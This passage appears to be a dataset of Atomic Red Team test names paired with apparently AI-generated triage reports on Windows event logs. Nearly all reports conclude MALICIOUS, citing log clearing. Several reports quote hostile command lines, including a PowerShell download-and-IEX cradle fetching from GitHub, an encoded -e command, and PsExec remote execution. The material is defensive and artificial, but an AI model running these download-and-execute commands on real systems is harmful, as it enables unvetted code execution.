   - Implement tighter monitoring and alerts for event log clearing activities and unusual process executions. Deploy advanced threat detection tools to flag similar activities in the future.
   
4. **Review and Patch Security Posture:**
   - Conduct a security audit, apply necessary patches, and review the configuration of security tools to prevent exploitation of vulnerabilities.

5. **Security Awareness and Training:**
   - Train and sensitize staff, especially privileged users to recognize and respond to suspicious activities and adhere to best practices for cybersecurity.

The observed events are strongly indicative of malicious activities requiring immediate and comprehensive action."
Run Shellcode via Syscall in Go,"Upon carefully analyzing the provided Windows event logs for Server002, several key observations highlight potentially suspicious and malicious activities, which entail further scrutiny:

### Analysis Summary:
1. **Execution of Unusual Command-Line Arguments:**
   - A PowerShell command is used to execute a binary `syscall.exe` located in a suspicious temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1106\bin\x64\`). The invocation of `syscall.exe` via PowerShell with the `-debug` flag is notably suspicious as Atomic Red Team's activities mimic adversarial behavior to evaluate defenses. Such behavior suggests a test or potentially a live attack.

2. **Clearing of Windows Event Logs:**
   - Multiple logs across different channels, including Security, System, and Windows PowerShell, have been cleared. Specifically, entries (`EventID 1102` in the Security log and `EventID 104` in System and PowerShell logs) show deletions by the user `admin_test`. Log clearing can be indicative of an attempt to cover tracks following potentially malicious activities.

3. **Integrity Level and User Context Tracing:**
   - Most processes, including PowerShell and event log utilities like `wevtutil.exe`, run at a high integrity level under the `SERVER002\admin_test` account. While the use of `conhost.exe` is typical, the parent processes often involve `wevtutil.exe`, frequently used to interact with event logs.

4. **Process Creation by PowerShell:**
   - The sequence of events suggests a PowerShell process spawned `syscall.exe`, possibly as an exploitation or lateral movement attempt given the context of Atomic Red Team testing scenarios.

5. **Presence of Tools and Execution Patterns:**
   - The execution of utilities such as `hostname.exe` and `whoami.exe` from atypical directories can indicate attempts to gather system and user information stealthily.

### Assessment:

- The combination of the execution of a questionable binary using PowerShell, especially within a path associated with known security testing frameworks (Atomic Red Team), alongside the clearing of critical event logs, strongly suggests malicious intent rather than mere benign activity.

### Resolution:

- **MALICIOUS**: Given the presence of indicators such as executing binaries from temporary directories, potential exploitation patterns simulated by Atomic Red Team tools, and deliberate log clearing activities, it is determined that these logs exhibit clear signs of malicious activity.

### Next Steps and Recommendations:

1. **Immediate Containment and Investigation:**
   - Isolate Server002 to prevent further potential compromise.
   - Conduct a thorough forensic analysis of the system, focusing on the specific timeframe and directory where `syscall.exe` was executed.

2. **Review and Monitor User Accounts:**
   - Investigate `SERVER002\admin_test` account for unauthorized or suspicious activities. Implement stringent access controls.

3. **Audit and Enhance Logging:**
   - Reinstate robust logging mechanisms to capture detailed event trails.
   - Enable centralized log management to prevent unauthorized log clearance in the future.

4. **Reassess Security Measures:**
   - Evaluate the current security posture and response plan to ensure rapid detection and containment of similar future incidents.

5. **Awareness and Training:**
   - Educate relevant personnel on recognizing and reacting to indicators of compromise, ensuring prompt reporting and handling of suspicious activities."

### Indicators of Suspicious or Malicious Activity

1. **Log Clearing Events:**
   - The logs show several instances of event log clearing. Event 1102 from the security log and Event 104 from the system log indicate actions taken by `admin_test` to clear logs. This is a strong indication of nefarious intent, as clearing logs is often done by attackers attempting to cover tracks. 
   - Relevant events:
     - Security log: `EventID 1102` - Security log cleared.
     - System log: `EventID 104` - Indicating system log and Windows PowerShell log were cleared.

2. **Suspicious Command Execution:**
   - EventID 1 in the Sysmon log indicates the execution of `cmd.exe` with the following suspicious command-line string:
     ```plaintext
     ""cmd.exe"" /c ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX""
     ```
   - This command downloads and executes commands from a remote URL, indicative of remote script execution or command-and-control activity.

3. **High-Integrity Level Processes:**
   - Processes are being run with high integrity, indicating administrative privileges on the actions performed by `admin_test`.

4. **Malicious Indicators:**
   - The suspicious command execution involving the use of PowerShell to load and execute remote content without user profile and bypassing execution policy is a known tactic used for lateral movement or payload download in attacks.

### Conclusion and Recommendation
Based on the observed activities, especially the clearing of logs and suspicious command execution to download and execute external scripts, the assessment is:
- **Resolution:** MALICIOUS

### Guidance
Immediate actions should include:
- Isolate the affected system (Server002) from the network to prevent further malicious activity and lateral spread.
- Conduct a thorough forensic investigation to determine the extent of the compromise.
- Review and secure account credentials related to `admin_test` as these may have been compromised.
- Restore the system from a clean backup if available and ensure all patches and security measures are updated before reintegrating the machine into the network."
WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,"Based on the provided Windows event logs, here’s the analysis:

### Analysis of Logs

1. **Security Log:**
   - Event 1102 indicates log clearing by user `admin_test`. Clearing logs is a red flag and often indicative of an attempt to hide malicious activity.
   - Event 4616 shows a suspicious change in system time, which could be used to manipulate logs, but it needs further corroboration with other activities.

2. **Application Log:**
   - Standard operations without any apparent anomalies. The Software Protection Platform service logs are normal.

3. **System Log:**
   - Multiple log entries indicating log clearing by `admin_test` (Event ID 104 for different channels, including System and PowerShell). This is indicative of suspicious behavior.

4. **Windows PowerShell Log:**
   - There is a PowerShell command execution that uses `iex(new-object net.webclient).downloadstring(...)`, a known technique for downloading and executing scripts from the internet, often used in malicious activities or penetration tests.
   - The URL being called is a public GitHub repository for hacking techniques. This is highly suspicious and potentially malicious.

5. **Sysmon Log:**
   - Processes like `wevtutil.exe` are used to clear event logs, correlating with the Security and System logs findings.
   - There is evidence of PowerShell being used with a command line that downloads and executes a script, similar to the Windows PowerShell log.
   - There are multiple executions of processes with high integrity levels, including `whoami.exe`, `conhost.exe`, and `csc.exe`, following the download and execution of the PowerShell script. These could be part of a script or payload execution chain which looks suspicious.

### Assessment
- **Indicators of Compromise (IoCs):**
  - Logs cleared using built-in utilities like `wevtutil.exe`.
  - Use of PowerShell to download and execute scripts from an external URL.
  - Changes to system time without a legitimate reason.
  
The combination of log clearing actions, use of PowerShell for potentially malicious purposes, suspicious system time changes, and downloading scripts from an external and potentially malicious source creates a compelling picture of malicious activity.

### Resolution: **MALICIOUS**
The logs contain activities that are indicative of malicious operations aimed at compromising the system and covering tracks (log clearing, potential payload download and execution). Immediate incident response actions should be taken, including:
- Isolating the affected system from the network.
- Performing a detailed forensic investigation.
- Identifying and mitigating all malicious scripts and processes.
- Reviewing access logs to identify further unauthorized access attempts or actions.
- Resetting credentials for compromised accounts.
- Assessing the extent of the compromise to other parts of the network or systems."
PowerShell Command Execution,"### Analysis of Logs:

#### **PowerShell Logs:**

- The PowerShell logs show multiple instances of `powershell.exe` being executed with a base64 encoded command (`-e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==`). This encoding is commonly used for obfuscating malicious code.
- The execution of PowerShell with encoded commands is a strong indicator of potential malicious activity, as this technique is often used to bypass security measures and execute unwanted scripts.

#### **Security Logs:**

- The security log entry `1102` indicates that the event log was cleared by a user `admin_test`. This is suspicious as log clearing is often performed to erase traces of unauthorized or malicious activity.
- The system time was adjusted using `svchost.exe`, but without any clear context or repetitive pattern, this alone is not immediately alarming. However, in conjunction with other activities, it can suggest attempts to cover traces.

#### **System Logs:**

- Similar to security logs, system logs indicate that logs were cleared which aligns with the user `admin_test` as per the security logs. This activity is generally considered suspicious.
- There are entries indicating synchronization with `time.windows.com`, which is a normal operation for maintaining accurate system time.

#### **Sysmon Logs:**

- Multiple uses of `wevtutil.exe` to clear different event logs (`System`, `Application`, `Security`) are logged. This aligns with the security event log clearing and is often a red flag for threat actors trying to eliminate evidence of their activities.
- There are several instances of `cmd.exe` launching `powershell.exe` with encoded commands, which is a known tactic for executing malicious payloads without triggering basic PowerShell script execution policies.
- `whoami.exe` and other utilities (`HOSTNAME.EXE`) were also executed. While these are benign utilities, their usage could be part of reconnaissance activities by an attacker.

### Assessment:

Based on the log analysis, the following observations suggest malicious activity:
- The use of base64 encoded commands in PowerShell executions.
- Clearing of event logs, both security and system logs, by user `admin_test`.
- Usage of `cmd.exe` to run PowerShell encoded scripts.
- Use of wevtutil to clear logs, which is a strong indicator of malicious actions aiming to cover activity tracks.

### Recommendation:

Given these findings, it appears that there is a strong indicator of malicious activity taking place on the host system. Immediate action should include:
- Conducting a full forensic investigation to identify the scope and impact of the compromise.
- Identifying and isolating the affected systems to prevent further unauthorized access.
- Reviewing network traffic for any unusual connections or data exfiltration activities.
- Changing credentials and strengthening security measures, such as implementing better logging and monitoring, and tightening PowerShell execution policies.

### Resolution:

**MALICIOUS** - The logs indicate clear signs of malicious activity primarily revolving around obfuscated command execution and log tampering."
Use PsExec to execute a command on a remote host,"Based on the investigation of the provided Windows event logs, the following findings and analysis indicate signs of potential compromise:

1. **Unusual PowerShell Execution**:
   - **EventID 5**: shows the execution of `powershell.exe` by the `admin_test` user. PowerShell is a legitimate tool but frequently used for malicious purposes. Although this alone isn't immediately suspicious, it warrants attention when combined with other factors.

2. **Suspicious Log Clearing Activities**:
   - **Security Log 1102**: Details the clearing of security logs by `admin_test` at `14:33:53.0579326`. This action is highly suspicious, as clearing logs is often an indicator of an attempt to erase traces of malicious activity.
   - **System Log 104**: Similar log clearing actions for both the System and Windows PowerShell logs are performed by `admin_test`.

3. **Execution of `wevtutil.exe`**:
   - Events show multiple instances where `wevtutil.exe` is used with the command line argument `cl`, which is utilized to clear event logs. This corresponds with the suspicious log clearing activities mentioned earlier.

4. **External Payload Execution via PsExec**:
   - **Sysmon Event 17995**: A command is run using `cmd.exe`, employing `PsExec.exe` to execute `calc.exe` on localhost with domain administrator credentials. The use of `PsExec` in this manner alongside a typical Windows application (`calc.exe`) could indicate the execution of a test or unauthorized task. The presence of `ExternalPayloads` in the file path is highly indicative of testing or misuse often aligned with red team operations or infiltration exercises.

5. **Concurrent Edge Update Activity**:
   - Multiple logs refer to the Microsoft Edge Update processes running around the same time. These are likely benign and part of routine system updates toward Microsoft Edge.

**Assessment and Resolution**: The actions highlighted, specifically the clearing of logs, unusual PowerShell usage, and use of `PsExec` with administrative privilege, collectively suggest unauthorized or malicious activity was conducted on the system. The combination of activities detected is often associated with an attempt to perform actions stealthily and possibly test defensive measures. Therefore, the scenario is assessed as:

**MALICIOUS**

**Guidance**:
- Immediate containment of the `Server002` machine to prevent further potential malicious activities.
- Conduct a comprehensive review of all user accounts, especially `admin_test`, for unauthorized access.
- Forensic analysis on any remnants of altered or deleted logs.
- Increase monitoring of PowerShell and similar legitimate utilities often misused for cyber attacks.
- Review and tighten security policies around log clearing and utilize tools to alert security teams on such activities, if not done already."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"Upon reviewing the provided Windows event logs from the machine named ""Server002,"" several indicators suggest potentially malicious activity that should be investigated further. Below is a detailed analysis based on the different logs:

### PowerShell Log Analysis:
1. **PowerShell Execution**:
   - The logs document multiple PowerShell processes starting with command line arguments that include encoded arguments and execution commands. This is somewhat typical in legitimate script automation or administrative tasks but also aligns with a common technique used by attackers to obfuscate their actions. Specific attention to the command `Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop` suggests actions designed to hide the true intent or nature of the command.
   - One of the PowerShell commands found includes the execution policy being set to restricted and examining `*.inf` files for specific install directives, which can be an indicator of reconnaissance or preparation for privilege escalation or persistence.

### System Log Analysis:
2. **Event Log Clearing**:
   - The logs indicate that the event logs for the System, Security, and Windows PowerShell channels were cleared by a user named ""admin_test"". Log clearing is a commonly known step conducted by malicious users or entities attempting to cover their tracks after conducting suspicious or malicious activities.
   
3. **Windows Update Activity**:
   - Multiple Windows update events are noted, which appear regular at first but can sometimes be indicative of Trojanized updates in sophisticated attacks. However, without further context or anomalous update versions, this in isolation isn't cause for concern.

### Security Log Analysis:
4. **Security Log Details**:
   - The logs indicate multiple 5379 events, which detail credential access activity that could point to failed attempts or defaults while trying to access sensitive configuration files or resources. Additional inspection into the source and context would be beneficial.
   
5. **Persistence through Privileges**:
   - The presence of a 4672 event log showing SYSTEM privileges being asserted can either be standard behavior or a sign of privilege abuse if concurrent with other suspicious activities.

### Sysmon Log Analysis:
6. **Process Creation**:
   - The Sysmon logs show multiple instances of `wevtutil.exe` being executed by the ""admin_test"" user, which is used to clear event logs. This furthers the suspicion around log tampering and matches known behaviors used to cover tracks.
   - Activities involving PowerShell, `wevtutil.exe`, `conhost.exe`, and several other utilities are consistent with common post-exploitation methodologies for maintaining access, lateral movement, or data exfiltration.

### Recommendations and Conclusion:
Given the observations:

- **Resolution**: **SUSPICIOUS**
- **Summary**: There are several red flags, such as the clearing of event logs, potential obfuscation in PowerShell commands, and unusually frequent administrative-level activities. These could suggest post-exploitation behavior or preparations for malicious activities.
- **Next Steps**:
  - Conduct a thorough endpoint detection and response (EDR) scan on Server002 to confirm and trace suspicious activities.
  - Review user account ""admin_test"" for unauthorized access or credential misuse, examine account activity, and change passwords if necessary.
  - Analyze network traffic patterns during these events for any potential data exfiltration activities.
  - Corroborate with related network or system logs to identify initial access vectors and scope of potential compromise.
  - Increase monitoring and alerting on PowerShell executions and event log activities for early detection of similar future behaviors. 

Considering the potential risks indicated by these activities, further in-depth analysis and investigation are recommended to rule out or confirm maliciousness."
Cobalt Strike SSH (postex_ssh) pipe,"**Analysis of Logs:**

Upon reviewing the provided logs from the Windows host, there are several indicators of potentially suspicious and malicious activity:

1. **Sysmon Logs:**

     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
   - The above actions often indicate an attempt to cover tracks, common in malicious activities.

2. **Security Logs:**
   - Event ID 1102 (Log File Cleared) and the time stamps in the security logs confirm that event logs were cleared by the user ""admin_test."" This is strongly associated with malicious activities wanting to hide their tracks.
   - This same user (""admin_test"") triggered the clearing of logs across multiple channels, which is highly suspicious.
   
3. **System Logs:**
   - Similar to the Security Logs, we have confirming log clearance actions.

4. **Command-line Executions:**
   - Mention of command-line usage of PowerShell and CMD that involve tools typically used for log management or system commands (e.g., `""cmd.exe"" /c` indicates execution of another executable potentially used in a malicious context).

5. **Running of Suspicious Executables:**
   - `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` are executed from a temp directory, which may indicate lateral movement or exploitation activity with the use of named pipes.
   - These files are executed from a non-standard directory, which often suggests potentially malicious activity.

6. **Privileges and Process Activities:**
   - Several processes and activities are executed with a high integrity level and SYSTEM privileges, correlating with further attempts to hide or escalate privileges.

7. **Indicators of Attack Simulation or Testing:**
   - The named pipe executables correlate with known adversary simulation tools like AtomicRedTeam tests, indicating potential Red Team activities or malicious behaviors.

**Assessment:**

Given the evidence, there are compelling indicators of malicious activities due to the clearing of log files, execution of potentially suspicious tools, and the leveraging of administrative privileges to perform such actions.

- **Resolution:** **MALICIOUS**

**Guidance on How to Proceed:**

1. **Isolate the System:** Immediately isolate the system from the network to prevent the spread of any potential malicious activity.

2. **Security Audit:** Conduct a thorough security audit to identify any unauthorized access or changes to system configurations, files, or installed software.

WMI Reconnaissance Processes,"Upon analyzing the provided logs, I have identified several patterns and insights:

1. **Log Clearing Activities**:
   - **EventID 1102** in the Security log indicates that the Security event log was cleared by the user `admin_test`.
   - **EventID 104** in the System log shows the System and Windows PowerShell event logs were cleared by the same user.

2. **Usage of System Utilities for Clearing Logs**:
   - The `wevtutil` process, which is used to manage Windows Event Logs, was executed multiple times to clear different event logs. This aligns with the timestamps of the log clearing events.

3. **High Integrity Execution**:
   - The `wevtutil.exe` was executed with a high integrity level, indicating that it was run with elevated privileges, reinforcing the log clearing actions.

4. **User Patterns**:
   - The suspicious activities are centered around the user `SERVER002\\admin_test`, indicating possible unauthorized actions or inappropriate privilege use.

5. **Unrelated System Updates**:
   - Numerous entries related to Microsoft Edge updates (`setup.exe`) executed under NT AUTHORITY\System are noted. These are typical regular system update processes and appear benign.

6. **Behavior Analysis**:
   - The act of clearing logs, especially the Security log, is frequently an indicator of an attempt to cover tracks following unauthorized actions.
   - The combination of elevated use of `wevtutil` to clear logs suggests an intention to obfuscate system activities, which is characteristic of malicious behavior.

**Assessment**:
Based on the evidence from the Security and System logs indicating deliberate clearing of logs and the elevated use of system utilities by the same account (`admin_test`), I conclude that there is an attempt to mask activities on the host.

**Resolution: MALICIOUS**:
The activity observed is a clear indicator of potentially malicious behavior. It involves unauthorized use of administrative privileges to clear important event logs, likely to hide misuse or intrusion.

**Guidance**:
- Immediately audit and restrict the credentials of `admin_test`.
- Implement stricter access controls and monitor for further attempts of log clearing.
- Conduct a comprehensive system review to detect any other signs of compromise.
- Enforce detailed logging and alerting mechanisms for high-privilege actions.
- Review any recent system changes or insider activity correlating with these events."
Writes text to a file and displays it,"After analyzing the provided log entries, several observations are made that indicate suspicious activity on the system:

### Suspicious or Anomalous Behavior:

1. **Clearance of Event Logs:**
   - Entries in the System, Windows PowerShell, and Security logs were cleared shortly before the timestamp on several event entries. Specifically, the following events were logged:
     - **System Log (EventID 104):** Event log for ""System"" and ""Windows PowerShell"" were cleared by the user `admin_test`.
     - **Security Log (EventID 1102):** Security logs were cleared by `admin_test`.

   Clearing event logs is a common tactic used by malicious actors to cover their tracks after compromising a system.

2. **Execution of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` command were executed, corresponding to clearing of different logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). The command line argument used (`cl`) suggests these commands were used to clear logs, aligning with the evidence of cleared logs.
   - `wevtutil.exe` is a legitimate Windows utility tool, but its repeated use for clearing logs with high integrity levels and by a user with elevated privileges is suspect.

3. **Unusual use of `cmd.exe`:**
   - The command `cmd.exe` was executed with an argument to create and display a test file in the temp directory, which seems benign, but coupled with the other activities happening around the same time (clearing logs), raises suspicion of potential script or malware execution practices.

4. **Admin Test Privileges:**
   - The user `admin_test` has significant privileges, indicated by the `SeSecurityPrivilege`, `SeBackupPrivilege`, and other high-level privileges that allow managing security logs and could have been misused for malicious purposes.

### Assessment:

The sequence of events shows a clear pattern of potential malicious activity:
- Frequent and systematic log clearing actions by an account with admin privileges, `admin_test`.
- The presence of elevated privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` which can be used for malware persistence.
- Use of `wevtutil.exe` for clearing of logs is consistent with tactics used to hide malicious activities.

### Resolution:

Based on the above analysis, the activities recorded in these logs are categorized as:
- **MALICIOUS**: The logs contain clear signs of possible compromise practices including the clearing of logs and elevated privilege uses meant for persisting access and evading detections.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the host (Server002) from the network to prevent further propagation or exfiltration.
   - Change passwords and review permissions for the `admin_test` account and any associated accounts.
   - Increase monitoring for similar activities across the network.

2. **Investigation & Remediation:**
   - Conduct a full investigation to understand the extent of the breach or compromise.
   - Use known clean backups to restore system integrity if necessary.
   - Review and audit security configurations and policies to prevent similar incidents.

LNK Payload Download,"### Analysis of the Logs

**1. Log Clearing Events:**
   - **System Log Event ID 104 and Security Log Event ID 1102** indicate log files being cleared for the `System`, `Windows PowerShell`, and `Security` channels. These actions were performed by the user `admin_test`. Clearing event logs is a known tactic used by attackers to cover their tracks.

**2. PowerShell Activity:**
   - **Sysmon Log Event ID 1** with `Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` shows a PowerShell command that downloads a shortcut file from an external URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk`) and executes it. The command includes `Start-Process` and `taskkill`, which can be associated with malicious activity, especially given the source of the file.

**3. Process Execution and Parent Process:**
   - Execution of `whoami.exe`, `wevtutil.exe`, and other Windows utilities from an account with high integrity level, i.e., `SERVER002\\admin_test`, indicates a likely interactive session or script being executed under an admin account.
   - The use of `taskkill` from `powershell.exe` to kill a specific process (`a.exe`) reinforces the possibly automated or malicious script execution designed to manipulate running processes.

**4. Time Change Events:**
   - **Security Log Event ID 4616** indicates time adjustments made by the `svchost.exe` process, but the reason and legitimate context for this alteration is unclear. Although not necessarily malicious by itself, it's worth being aware of in combination with other dubious activities.

### Assessment

The correlation of cleared logs, PowerShell usage with external downloads, and `taskkill` operations strongly suggest an attempt at obfuscating actions typically indicative of an intrusion or compromise:

- Clearing of logs, especially across multiple channels (`System`, `Windows PowerShell`, `Security`).
- Execution of PowerShell scripts that download and initiate external and potentially malicious content.
- High-integrity-level user such as `admin_test` performing these actions raises the stakes for privilege misuse or escalation concerns.

### Conclusion

Based on the gathered evidence, the behavior detected in these logs is best categorized as **MALICIOUS**. The log clear operations, PowerShell script execution from an external source, and subsequent actions are classic signs of adversarial tactics employed in intrusions.

### Guidance

- **Audit and Review User Accounts:** Review the admin accounts for any unauthorized changes or misuse.
- **Threat Intelligence Integration:** Check the downloaded file hash and domain against known threat databases for malicious indicators.
- **Enhance Security Measures:** Implement measures like PowerShell script logging, AMSI integration, and enforce strict access controls and audit policies to prevent similar incidents in the future."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"### Analysis of Provided Windows Event Logs

Upon analyzing the provided event logs, several key activities stand out that may suggest potential malicious behavior. Let’s break down the analysis:

1. **Use of PowerShell and Encoded Commands:**
   - **Sysmon EventID 1 (Process Create):** There are multiple instances of PowerShell being executed (e.g., EventRecordID 18043) with an encoded command. Encoded PowerShell commands are commonly used by attackers to obfuscate malicious actions, as encoding makes it difficult to read commands directly.
   - **PowerShell Logs (EventID 600):** The execution of PowerShell commands with the encoded command parameter indicates potentially suspicious activity that must be scrutinized further to decode and understand the commands being executed.

2. **Event Logs Clearance:**
   - **System Log (EventID 104) and Security Log (EventID 1102):** The logs indicate that the System and Security event logs were cleared by the user `admin_test`. Clearing event logs is a tactic used by attackers to erase their tracks after or during malicious operations.

3. **Command-Line Utility Execution:**
   - The use of `wevtutil.exe` to clear logs (e.g., Sysmon EventID 1 for EventRecordID 18031) under a high integrity level suggests that it was leveraged to clear evidence from logs on the `Server002` system.
   
4. **Processes Executed with Uncommon Arguments:**
   - Multiple instances of `conhost.exe` are noted, which is the Console Window Host process, typically associated with console applications. The consistent pairing with `wevtutil.exe` and unusual command-line activity (e.g., using `-ForceV1` flags) raises suspicion of scripted operations conducted via command line.

### Assessment:

- **PowerShell with Encoded Commands:** The presence of encoded commands typically indicates obfuscation, which is often an indicator of suspicious activities. These should be decoded to understand the operations being conducted.
- **Event Log Clearance:** The clearing of the System and Security logs by `admin_test` without clear administrative or maintenance reasons should be considered suspicious activity that aligns with potential but not confirmed malicious intent.
- **Command Execution with High Integrity Levels:** The use of processes with elevated permissions to clear logs represents a potential privilege misuse scenario indicative of malicious intents like unauthorized access, covering tracks, or preparing for further persistence or lateral movement.

### Resolution:

**Resolution: MALICIOUS**

The combination of encoded PowerShell usage, the clearing of critical logs, and leveraging high-integrity processes strongly supports a malicious finding. Here’s the guidance on how to proceed:

1. **Immediate Action:** Isolate the affected host, `Server002`, to prevent potential lateral movement within the network.
2. **In-depth Investigation:** Decode the PowerShell commands to understand the actions taken and assess the potential impact.
3. **User Audit:** Conduct an audit on actions performed under the `admin_test` account to understand how the system was accessed and validate whether the actions were authorized or the account was compromised.
4. **Log Tracking:** Implement enhanced monitoring and alerts for activities such as log clearance and encoded command execution.
5. **Incident Response:** Engage the incident response team to assess the broader impact across the network and ensure no backdoors or additional unauthorized access methods have been planted.

Given the clear malicious indicators, the priority should be mitigating further risks and understanding the extent of the compromise."
BlackCat pre-encryption cmds with Lateral Movement,"Upon reviewing the provided Windows event logs, several elements stand out as pivotal in determining potential malicious activity. 

**Key Observations and Analysis:**

1. **Execution of PowerShell Scripts:**
   - A PowerShell script with significant command-line activity was executed under the user ""SERVER002\admin_test."" The script includes commands that adjust system registry settings and involve the use of utilities such as `wmic`, `fsutil`, and `psexec`. These commands are often used in both legitimate system administration and potential cyber threat techniques, such as lateral movement or privilege escalation, depending on context and intent.
   - The PowerShell command includes copying an executable named `PsExec.exe` to the temporary folder and attempting to execute the file remotely. PsExec is a utility often used by IT administrators for executing processes on other systems but can also be used by attackers once they have gained a foothold in a network.

2. **Event Log Clearing:**
   - The event logs indicate that the Windows PowerShell and System logs were cleared (`EventID: 104`) by the user ""admin_test."" Clearing event logs is highly suspicious and often a technique employed to cover tracks after executing malicious commands.

3. **Wevtutil CLI Commands:**
   - There were numerous executions of `wevtutil.exe` with the command line to clear event logs. This behavior suggests attempts to erase traces of activities conducted on the system.

4. **Sysmon Log Entries:**
   - There are multiple Sysmon event entries indicating process creations and file modifications involving utilities typically associated with remote execution and event management, which could suggest either administrative use or misuse.

5. **High Integrity Level:**
   - The processes were run with a high integrity level, indicating they have administrative privileges. This level of privilege could pose a risk if leveraged by unauthorized users for malicious purposes.

6. **Use of System/Network Tools:**
   - Presence and execution of network and system probing tools (`whoami.exe`, `hostname.exe`, `wmic.exe`) could signify reconnaissance activities, depending upon the intent behind their usage.

**Assessment and Resolution:**

The combination of PowerShell scripts executing potentially harmful commands, clearing of event logs, and use of administrative tools such as PsExec for remote execution strongly suggests malicious activity. While some activities might reflect legitimate administrative actions, the context and coherence of these logs indicate intentionally obfuscating activities.

**Conclusion: MALICIOUS**

Given the observed indicators, these logs provide evidence of likely malicious activity. Steps should be taken to further investigate the system for any indicators of compromise, revert any unauthorized changes, review user activity, and enact additional monitoring measures to prevent further malicious actions."
Cobalt Strike Lateral Movement (psexec_psh) pipe,"Based on the provided logs, here's the analysis:

### Suspicious and Malicious Activity:

1. **Wevtutil Executions:**
   - Repeated execution of `wevtutil.exe` with the `cl` (clear) command across multiple event logs (Sysmon, Application, Security, and System). This activity is performed by the user `SERVER002\\admin_test`.
   - Clearing logs, especially security logs, is typically indicative of attempts to hide malicious activities or traces of unauthorized access.

2. **Namedpipes Executor:**
   - The `cmd.exe` invokes `namedpipes_executor.exe` from a temp directory. This is a particularly unusual activity and is executed with a high integrity level. This could potentially be a part of an executed exploit or a lateral movement tool.
   - Following the execution of `namedpipes_executor.exe`, processes like `namedpipes_server.exe` and `namedpipes_client.exe` are launched, which could indicate communication setup for data exfiltration or covert transmission.

3. **Log Clearance Events:**
   - Security log event 1102 indicates the clearing of the security event log.
   - System and Application logs also capture the cleanup, which supports the suspicion that the actions were intended to conceal potentially unauthorized processes or activities.

### Threat Assessment:
This series of activities illustrates a high potential for unauthorized access or exploitation on Server002. The behavior, especially log clearing using `wevtutil` and usage of executables from non-standard directories, falls squarely into the tactics described by various threat actor behaviors such as data exfiltration, persistence, and defense evasion.

### Resolution:
**MALICIOUS** - The activity patterns, especially log clearing using `wevtutil` and the suspicious execution of `namedpipes_executor.exe`, is indicative of malicious intent, likely aimed at evading detection and hiding attacker tracks. Immediate incident response is warranted.

### Recommended Actions:
1. **Isolate the System:** Temporarily disconnect Server002 from the network to prevent further potential lateral movement or data exfiltration.
2. **Investigate Further:** Use an endpoint detection and response (EDR) tool to identify other processes and files associated with `namedpipes_executor`, including potential backdoors or malware.
3. **Review User Activity:** Investigate the activities of the user `admin_test` and other changes in privilege or unauthorized access attempts.
4. **Restore from Backup:** Consider restoring the system from a backup taken before October 28, 2024, as the logs indicate this is when malicious activities were executed.
5. **Strengthen Security Policies:** Implement strict execution policies and monitor for the use of tools like `wevtutil.exe` and execution from temp directories to prevent unauthorized access and execution attempts in the future."
Office Generic Payload Download,"After a detailed analysis of the provided event logs, I have identified several indicators of potentially malicious activity:

1. **PowerShell Execution with Suspicious Script**:
   - There are multiple instances of `powershell.exe` execution logging an unusual and potentially malicious script being executed. The script involves downloading a payload from an external source (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`), which is known to be part of a proof-of-concept for a security test, indicating an attempt to execute or simulate malicious activity.
   - This type of behavior is consistent with techniques often used in attacks to download and execute scripts or payloads.

2. **Event Log Clearing**:
   - The security logs show that someone using the `admin_test` account cleared the logs (Event ID 1102). This action is typically used to cover tracks after malicious activity, as it removes evidence from the event logs.

3. **Suspicious Use of `wevtutil.exe`**:
   - The utility `wevtutil.exe` was used several times to clear event logs or query logs, which correlates with the log clearing activity mentioned above. This utility is sometimes used by attackers to erase traces of their actions or manipulate logs.

4. **Indicators of Potential Unauthorized or Misuse of Privileged Commands**:
   - Commands like `whoami.exe` and `hostname.exe` were executed, which can be used by attackers to gather information about the system environment and the current privileges.

**Assessment and Recommendation**:
- The chain of PowerShell activities, downloading from an external URL, event log clearing, and subsequent utility executions strongly indicate malicious activity.
  
- **Resolution**: MALICIOUS. The activity observed in the logs—executing potentially harmful PowerShell scripts, clearing event logs, and using command-line utilities in an unusual manner—are classic indicators of compromise. Immediate steps should be taken to investigate the extent of the compromise, secure the environment, and potentially isolate or remediate the affected system.

**Suggested Actions**:
- Immediately isolate the affected machine to prevent further spread of any potential threats.
- Conduct a thorough investigation, potentially involving digital forensics, to understand the scope of the activity.
- Review and strengthen security controls and monitoring, specifically around PowerShell usage and log management.
- Consider notifying incident response teams for containment and eradication activities.
- Reset credentials for any affected accounts, especially those with administrative access."
Create a Process using obfuscated Win32_Process,"Upon analyzing the provided Windows event logs, several activities indicate potential malicious behavior:

1. **PowerShell Usage**: 
   - The PowerShell logs show a script that attempts to create a new unregistered WMI class (`Win32_Atomic`) and invoke `WmiMethod` to start `notepad.exe`. This is an unusual and suspicious PowerShell activity often seen in malicious scenarios, as attackers commonly misuse WMI to execute arbitrary commands and launch processes.

